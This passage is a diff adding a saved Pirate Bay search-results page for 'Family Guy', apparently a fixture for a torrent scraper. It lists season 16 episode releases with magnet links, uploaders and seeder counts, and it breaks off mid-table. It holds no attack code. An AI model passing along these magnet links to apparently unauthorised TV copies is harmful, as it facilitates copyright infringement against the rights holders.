@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>The Pirate Bay - The galaxy's most resilient bittorrent site</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+    <link rel="search" type="application/opensearchdescription+xml" href="/opensearch.xml" title="Search The Pirate Bay" />
+    <link rel="stylesheet" type="text/css" href="//thepiratebay.org/static/css/pirate6.css"/>
+    <link rel="dns-prefetch" href="//syndication.exoclick.com/">
+    <link rel="dns-prefetch" href="//main.exoclick.com/">
+    <link rel="dns-prefetch" href="//static-ssl.exoclick.com/">
+    <link rel="dns-prefetch" href="//2468.go2cloud.org">
+    <link rel="dns-prefetch" href="//protect-your-privacy.net">
+    <link rel="dns-prefetch" href="//anonymous-net.com">
+    <link rel="dns-prefetch" href="//ads.exosrv.com">
+    <link rel="dns-prefetch" href="//s3.amazonaws.com">
+    <link rel="dns-prefetch" href="//traffic.adxprtz.com">
+    <link rel="canonical" href="//thepiratebay.org/search/Family%20Guy/0/99/0" />
+    <style type="text/css">
+        .searchBox{
+            margin: 6px;
+            width: 300px;
+            vertical-align: middle;
+            padding: 2px;
+            background-image:url('//thepiratebay.org/static/img/icon-https.gif');
+            background-repeat:no-repeat;
+            background-position: right;
+        }
+        .detLink {
+            font-size: 1.2em;
+            font-weight: 400;
+        }
+        .detDesc {
+            color: #4e5456;
+        }
+        .detDesc a:hover {
+            color: #000099;
+            text-decoration: underline;
+        }
+        .sortby {
+            text-align: left;
+            float: left;
+        }
+        .detName {
+            padding-top: 3px;
+            padding-bottom: 2px;
+        }
+        .viewswitch {
+            font-style: normal;
+            float: right;
+            text-align: right;
+            font-weight: normal;
+        }
+    </style>
+    <script src="//thepiratebay.org/static/js/jquery.min.js" type="text/javascript"></script>
+    <script src="//thepiratebay.org/static/js/tpb.js" type="text/javascript"></script>
+    <meta name="description" content="Search for and download any torrent from the pirate bay using search query Family Guy. Direct download via magnet link."/>
+    <meta name="keywords" content="Family Guy direct download torrent magnet tpb piratebay search"/>
+
+    <script language="javascript" type="text/javascript">if (top.location != self.location) {top.location.replace(self.location);}</script>
+</head>
+
+<body>
+    <div id="header">
+
+        <form method="get" id="q" action="/s/">
+            <a href="/" class="img"><img src="//thepiratebay.org/static/img/tpblogo_sm_ny.gif" id="TPBlogo" alt="The Pirate Bay" /></a>
+            <b><a href="/" title="Search Torrents">Search Torrents</a></b>&nbsp;&nbsp;|&nbsp;
+ <a href="/browse" title="Browse Torrents">Browse Torrents</a>&nbsp;&nbsp;|&nbsp;
+ <a href="/recent" title="Recent Torrent">Recent Torrents</a>&nbsp;&nbsp;|&nbsp;
+ <a href="/tv/" title="TV shows">TV shows</a>&nbsp;&nbsp;|&nbsp;
+ <a href="/music" title="Music">Music</a>&nbsp;&nbsp;|&nbsp;
+ <a href="/top" title="Top 100">Top 100</a>
+            <br /><input type="search" class="inputbox" title="Pirate Search" name="q" placeholder="Search here..." value="Family Guy" /><input value="Pirate Search" type="submit" class="submitbutton"  /><br />            <label for="audio" title="Audio"><input id="audio" name="audio" onclick="javascript:rmAll();" type="checkbox"/>Audio</label>
+            <label for="video" title="Video"><input id="video" name="video" onclick="javascript:rmAll();" type="checkbox"/>Video</label>
+            <label for="apps" title="Applications"><input id="apps" name="apps" onclick="javascript:rmAll();" type="checkbox"/>Applications</label>
+            <label for="games" title="Games"><input id="games" name="games" onclick="javascript:rmAll();" type="checkbox"/>Games</label>
+            <label for="porn" title="Porn"><input id="porn" name="porn" onclick="javascript:rmAll();" type="checkbox"/>Porn</label>
+            <label for="other" title="Other"><input id="other" name="other" onclick="javascript:rmAll();" type="checkbox"/>Other</label>
+
+            <select id="category" name="category" onchange="javascript:setAll();">
+                <option value="0">All</option>
+                <optgroup label="Audio">
+                    <option value="101">Music</option>
+                    <option value="102">Audio books</option>
+                    <option value="103">Sound clips</option>
+                    <option value="104">FLAC</option>
+                    <option value="199">Other</option>
+                </optgroup>
+                <optgroup label="Video">
+                    <option value="201">Movies</option>
+                    <option value="202">Movies DVDR</option>
+                    <option value="203">Music videos</option>
+                    <option value="204">Movie clips</option>
+                    <option value="205">TV shows</option>
+                    <option value="206">Handheld</option>
+                    <option value="207">HD - Movies</option>
+                    <option value="208">HD - TV shows</option>
+                    <option value="209">3D</option>
+                    <option value="299">Other</option>
+                </optgroup>
+                <optgroup label="Applications">
+                    <option value="301">Windows</option>
+                    <option value="302">Mac</option>
+                    <option value="303">UNIX</option>
+                    <option value="304">Handheld</option>
+                    <option value="305">IOS (iPad/iPhone)</option>
+                    <option value="306">Android</option>
+                    <option value="399">Other OS</option>
+                </optgroup>
+                <optgroup label="Games">
+                    <option value="401">PC</option>
+                    <option value="402">Mac</option>
+                    <option value="403">PSx</option>
+                    <option value="404">XBOX360</option>
+                    <option value="405">Wii</option>
+                    <option value="406">Handheld</option>
+                    <option value="407">IOS (iPad/iPhone)</option>
+                    <option value="408">Android</option>
+                    <option value="499">Other</option>
+                </optgroup>
+                <optgroup label="Porn">
+                    <option value="501">Movies</option>
+                    <option value="502">Movies DVDR</option>
+                    <option value="503">Pictures</option>
+                    <option value="504">Games</option>
+                    <option value="505">HD - Movies</option>
+                    <option value="506">Movie clips</option>
+                    <option value="599">Other</option>
+                </optgroup>
+                <optgroup label="Other">
+                    <option value="601">E-books</option>
+                    <option value="602">Comics</option>
+                    <option value="603">Pictures</option>
+                    <option value="604">Covers</option>
+                    <option value="605">Physibles</option>
+                    <option value="699">Other</option>
+                </optgroup>
+            </select>
+
+            <input type="hidden" name="page" value="0" />
+            <input type="hidden" name="orderby" value="99" />
+        </form>
+    </div><!-- // div:header -->
+
+    <h2><span>Search results: Family Guy</span>&nbsp;Displaying hits from 0 to 30 (approx 9841 found)</h2>
+
+<div id="SearchResults"><div id="content">
+			<div id="sky-right">
+				 <iframe src="//thepiratebay.org/static/si0Eim0u/exo_na/sky2.html" width="160" height="600" frameborder="0" scrolling="no"></iframe>
+			</div>
+	
+			 <iframe src="//thepiratebay.org/static/si0Eim0u/exo_na/center.html" id="sky-center" width="728" height="90" frameborder="0" scrolling="no"></iframe>
+		<div id="main-content">
+<table id="searchResult">
+	<thead id="tableHead">
+		<tr class="header">
+			<th><a href="/search/Family%20Guy/0/13/0" title="Order by Type">Type</a></th>
+			<th><div class="sortby"><a href="/search/Family%20Guy/0/1/0" title="Order by Name">Name</a> (Order by: <a href="/search/Family%20Guy/0/3/0" title="Order by Uploaded">Uploaded</a>, <a href="/search/Family%20Guy/0/5/0" title="Order by Size">Size</a>, <span style="white-space: nowrap;"><a href="/search/Family%20Guy/0/11/0" title="Order by ULed by">ULed by</a></span>, <a href="/search/Family%20Guy/0/8/0" title="Order by Seeders">SE</a>, <a href="/search/Family%20Guy/0/9/0" title="Order by Leechers">LE</a>)</div><div class="viewswitch"> View: <a href="/switchview.php?view=s">Single</a> / Double&nbsp;</div></th>
+			<th><abbr title="Seeders"><a href="/search/Family%20Guy/0/8/0" title="Order by Seeders">SE</a></abbr></th>
+			<th><abbr title="Leechers"><a href="/search/Family%20Guy/0/9/0" title="Order by Leechers">LE</a></abbr></th>
+		</tr>
+	</thead>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/19329755/Family.Guy.S16E09.WEB.x264-TBS" class="detLink" title="Details for Family.Guy.S16E09.WEB.x264-TBS">Family.Guy.S16E09.WEB.x264-TBS</a>
+</div>
+<a href="magnet:?xt=urn:btih:3f774c87c0163646ecd63b4381b73c740313ec77&dn=Family.Guy.S16E09.WEB.x264-TBS&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=P3dMh8AWNkbs1jtDgbc8dAMT7Hc=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family.Guy.S16E09.WEB.x264-TBS" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><a href="/user/makintos13"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 12-11&nbsp;2017, Size 158.74&nbsp;MiB, ULed by <a class="detDesc" href="/user/makintos13/" title="Browse makintos13">makintos13</a></font>
+		</td>
+		<td align="right">1032</td>
+		<td align="right">143</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/19269300/Family.Guy.S16E08.REPACK.HDTV.x264-SVA" class="detLink" title="Details for Family.Guy.S16E08.REPACK.HDTV.x264-SVA">Family.Guy.S16E08.REPACK.HDTV.x264-SVA</a>
+</div>
+<a href="magnet:?xt=urn:btih:2470ba730ad474e9467dac1a09aa606ff6f4d0d2&dn=Family.Guy.S16E08.REPACK.HDTV.x264-SVA&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=JHC6cwrUdOlGfawaCapgb/b00NI=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family.Guy.S16E08.REPACK.HDTV.x264-SVA" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><a href="/user/makintos13"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 12-04&nbsp;2017, Size 84.95&nbsp;MiB, ULed by <a class="detDesc" href="/user/makintos13/" title="Browse makintos13">makintos13</a></font>
+		</td>
+		<td align="right">864</td>
+		<td align="right">100</td>
+	</tr>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/19104737/Family.Guy.S16E07.WEB.x264-TBS" class="detLink" title="Details for Family.Guy.S16E07.WEB.x264-TBS">Family.Guy.S16E07.WEB.x264-TBS</a>
+</div>
+<a href="magnet:?xt=urn:btih:16972e83b0b3322cb5489151d11a5367c5b9253d&dn=Family.Guy.S16E07.WEB.x264-TBS&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=Fpcug7CzMiy1SJFR0RpTZ8W5JT0=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family.Guy.S16E07.WEB.x264-TBS" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><img src="//thepiratebay.org/static/img/icon_comment.gif" alt="This torrent has 2 comments." title="This torrent has 2 comments." /><a href="/user/makintos13"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a>
+			<font class="detDesc">Uploaded 11-20&nbsp;2017, Size 144.84&nbsp;MiB, ULed by <a class="detDesc" href="/user/makintos13/" title="Browse makintos13">makintos13</a></font>
+		</td>
+		<td align="right">527</td>
+		<td align="right">9</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/208" title="More from this category">HD - TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/19329721/Family.Guy.S16E09.720p.WEB.x264-TBS" class="detLink" title="Details for Family.Guy.S16E09.720p.WEB.x264-TBS">Family.Guy.S16E09.720p.WEB.x264-TBS</a>
+</div>
+<a href="magnet:?xt=urn:btih:482380b2790676511b8a069750689418bf984d1d&dn=Family.Guy.S16E09.720p.WEB.x264-TBS&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=SCOAsnkGdlEbigaXUGiUGL+YTR0=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family.Guy.S16E09.720p.WEB.x264-TBS" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><a href="/user/makintos13"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 12-11&nbsp;2017, Size 393.77&nbsp;MiB, ULed by <a class="detDesc" href="/user/makintos13/" title="Browse makintos13">makintos13</a></font>
+		</td>
+		<td align="right">424</td>
+		<td align="right">14</td>
+	</tr>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/18675705/Family.Guy.S16E01.HDTV.x264-SVA" class="detLink" title="Details for Family.Guy.S16E01.HDTV.x264-SVA">Family.Guy.S16E01.HDTV.x264-SVA</a>
+</div>
+<a href="magnet:?xt=urn:btih:5205a9e3f6eed5eee95b458d0faabe0deafb82a7&dn=Family.Guy.S16E01.HDTV.x264-SVA&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=UgWp4/bu1e7pW0WND6q+Der7gqc=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family.Guy.S16E01.HDTV.x264-SVA" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><a href="/user/makintos13"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 10-02&nbsp;2017, Size 89.32&nbsp;MiB, ULed by <a class="detDesc" href="/user/makintos13/" title="Browse makintos13">makintos13</a></font>
+		</td>
+		<td align="right">343</td>
+		<td align="right">23</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/18745391/Family.Guy.S16E03.WEB.x264-TBS" class="detLink" title="Details for Family.Guy.S16E03.WEB.x264-TBS">Family.Guy.S16E03.WEB.x264-TBS</a>
+</div>
+<a href="magnet:?xt=urn:btih:acda8fb13a560250470bb0d2a1d7896e3526f0fb&dn=Family.Guy.S16E03.WEB.x264-TBS&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=rNqPsTpWAlBHC7DSodeJbjUm8Ps=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family.Guy.S16E03.WEB.x264-TBS" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><a href="/user/makintos13"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 10-16&nbsp;2017, Size 145.69&nbsp;MiB, ULed by <a class="detDesc" href="/user/makintos13/" title="Browse makintos13">makintos13</a></font>
+		</td>
+		<td align="right">326</td>
+		<td align="right">24</td>
+	</tr>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/208" title="More from this category">HD - TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/17819884/Family.Guy.Season.15.Complete.720p.WEB-DL.x264.AAC" class="detLink" title="Details for Family.Guy.Season.15.Complete.720p.WEB-DL.x264.AAC">Family.Guy.Season.15.Complete.720p.WEB-DL.x264.AAC</a>
+</div>
+<a href="magnet:?xt=urn:btih:a2ee323cb3a783c6f7fcf3ffd134446acfcc26c1&dn=Family.Guy.Season.15.Complete.720p.WEB-DL.x264.AAC&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=ou4yPLOng8b3/PP/0TREas/MJsE=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family.Guy.Season.15.Complete.720p.WEB-DL.x264.AAC" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><a href="/user/loadstone2k12"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 05-22&nbsp;2017, Size 2.9&nbsp;GiB, ULed by <a class="detDesc" href="/user/loadstone2k12/" title="Browse loadstone2k12">loadstone2k12</a></font>
+		</td>
+		<td align="right">217</td>
+		<td align="right">38</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/208" title="More from this category">HD - TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/19269339/Family.Guy.S16E08.REPACK.720p.HDTV.x264-AVS" class="detLink" title="Details for Family.Guy.S16E08.REPACK.720p.HDTV.x264-AVS">Family.Guy.S16E08.REPACK.720p.HDTV.x264-AVS</a>
+</div>
+<a href="magnet:?xt=urn:btih:4322da7a49e270594541026e9721dd24db850594&dn=Family.Guy.S16E08.REPACK.720p.HDTV.x264-AVS&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=QyLaeknicFlFQQJulyHdJNuFBZQ=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family.Guy.S16E08.REPACK.720p.HDTV.x264-AVS" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><a href="/user/makintos13"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 12-04&nbsp;2017, Size 354.96&nbsp;MiB, ULed by <a class="detDesc" href="/user/makintos13/" title="Browse makintos13">makintos13</a></font>
+		</td>
+		<td align="right">202</td>
+		<td align="right">7</td>
+	</tr>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/208" title="More from this category">HD - TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/19021746/Family.Guy.S16E06.720p.HDTV.x264-AVS" class="detLink" title="Details for Family.Guy.S16E06.720p.HDTV.x264-AVS">Family.Guy.S16E06.720p.HDTV.x264-AVS</a>
+</div>
+<a href="magnet:?xt=urn:btih:c0ba840a233273f9ebdc7e6213c6154758e0c7f3&dn=Family.Guy.S16E06.720p.HDTV.x264-AVS&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=wLqECiMyc/nr3H5iE8YVR1jgx/M=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family.Guy.S16E06.720p.HDTV.x264-AVS" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><a href="/user/makintos13"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 11-13&nbsp;2017, Size 390.26&nbsp;MiB, ULed by <a class="detDesc" href="/user/makintos13/" title="Browse makintos13">makintos13</a></font>
+		</td>
+		<td align="right">186</td>
+		<td align="right">13</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/208" title="More from this category">HD - TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/18969343/Family.Guy.S16E05.720p.WEB.x264-TBS" class="detLink" title="Details for Family.Guy.S16E05.720p.WEB.x264-TBS">Family.Guy.S16E05.720p.WEB.x264-TBS</a>
+</div>
+<a href="magnet:?xt=urn:btih:571342b33803bd78b60c4a2d1a2d28cbd92e22c6&dn=Family.Guy.S16E05.720p.WEB.x264-TBS&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=VxNCszgDvXi2DEotGi0oy9kuIsY=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family.Guy.S16E05.720p.WEB.x264-TBS" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><a href="/user/makintos13"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 11-06&nbsp;2017, Size 438.08&nbsp;MiB, ULed by <a class="detDesc" href="/user/makintos13/" title="Browse makintos13">makintos13</a></font>
+		</td>
+		<td align="right">149</td>
+		<td align="right">13</td>
+	</tr>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/208" title="More from this category">HD - TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/19104780/Family.Guy.S16E07.720p.WEB.x264-TBS" class="detLink" title="Details for Family.Guy.S16E07.720p.WEB.x264-TBS">Family.Guy.S16E07.720p.WEB.x264-TBS</a>
+</div>
+<a href="magnet:?xt=urn:btih:cd85a7f2a6e5f426f4031138c109dbb6874815a5&dn=Family.Guy.S16E07.720p.WEB.x264-TBS&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=zYWn8qbl9Cb0AxE4wQnbtodIFaU=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family.Guy.S16E07.720p.WEB.x264-TBS" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><a href="/user/makintos13"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 11-20&nbsp;2017, Size 315.77&nbsp;MiB, ULed by <a class="detDesc" href="/user/makintos13/" title="Browse makintos13">makintos13</a></font>
+		</td>
+		<td align="right">148</td>
+		<td align="right">45</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/19329761/Family.Guy.S16E09.HDTV.x264-SVA[ettv]" class="detLink" title="Details for Family.Guy.S16E09.HDTV.x264-SVA[ettv]">Family.Guy.S16E09.HDTV.x264-SVA[ettv]</a>
+</div>
+<a href="magnet:?xt=urn:btih:1e9fa4b751b34156079c3a4ef4f1f1cffe2b4920&dn=Family.Guy.S16E09.HDTV.x264-SVA%5Bettv%5D&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=Hp+kt1GzQVYHnDpO9PHxz/4rSSA=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family.Guy.S16E09.HDTV.x264-SVA[ettv]" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><a href="/user/ettv"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 12-11&nbsp;2017, Size 117.41&nbsp;MiB, ULed by <a class="detDesc" href="/user/ettv/" title="Browse ettv">ettv</a></font>
+		</td>
+		<td align="right">146</td>
+		<td align="right">6</td>
+	</tr>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/208" title="More from this category">HD - TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/18791326/Family.Guy.S16E04.720p.HDTV.x264-AVS" class="detLink" title="Details for Family.Guy.S16E04.720p.HDTV.x264-AVS">Family.Guy.S16E04.720p.HDTV.x264-AVS</a>
+</div>
